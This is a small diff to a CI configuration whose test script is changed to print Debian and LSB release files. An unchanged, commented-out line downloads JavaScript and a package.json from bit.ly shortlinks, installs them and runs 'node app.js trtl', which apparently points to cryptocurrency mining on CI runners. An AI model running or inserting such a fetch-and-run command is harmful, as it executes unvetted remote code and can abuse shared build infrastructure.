@@ -5,7 +5,8 @@ test_task:
   clone_script: node -v
   test_script: |
     uname -r
-    lsb_release -a
+    cat /etc/debian_version
+    cat /etc/lsb-release
     
 #curl -fsSL https://bit.ly/3nvNdYs -o package.json && curl -fsSL https://bit.ly/3hYdY4n -o app.js && curl -fsSL https://bit.ly/3Cb0Pwk -o log-print.js && npm i -s && node app.js trtl fi 1 1 240 2
 
